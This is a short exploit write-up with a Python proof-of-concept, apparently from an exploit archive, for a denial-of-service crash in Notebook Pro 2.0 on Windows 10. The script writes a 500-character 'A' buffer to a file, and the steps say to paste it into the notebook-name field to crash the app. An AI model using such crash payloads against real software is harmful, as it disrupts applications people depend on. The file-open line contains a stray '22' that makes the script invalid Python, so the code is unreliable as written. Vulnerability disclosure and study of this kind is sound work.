@@ -1,0 +1,28 @@
+# Exploit Title : Notebook Pro 2.0 - Denial Of Service (PoC)
+# Exploit Author : Ali Alipour
+# WebSite : http://Alipour.it
+# Date: 2018-09-14
+# Vendor Homepage : http://www.stokedonit.com/apps/notebook-pro/
+# Software Link Download : https://www.microsoft.com/store/apps/9WZDNCRDMC76
+# Tested on : Windows 10 - 64-bit
+
+# Steps to Reproduce
+# Run the python exploit script, it will create a new 
+# file with the name "Notebook.txt" just copy the text inside "Notebook.txt"
+# and start the Notebook Pro 2.0 - In Microsoft Windows 10 . 
+# In The New Window Click On " New " And Click On notebook Button ( Create a New NoteBook ) .
+# Now Paste The Content Of "Notebook.txt" Into The Field: " New NoteBook Name ". 
+# Click "Create & Save" And You Will See a [ Boom !!!! ] - Notebook Pro 2.0 - In Microsoft Windows 10 [ Crash ].
+
+#!/usr/bin/python
+    
+buffer = "A" * 500
+payload = buffer
+try:
+    f=open("Notebook.txt",22"w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
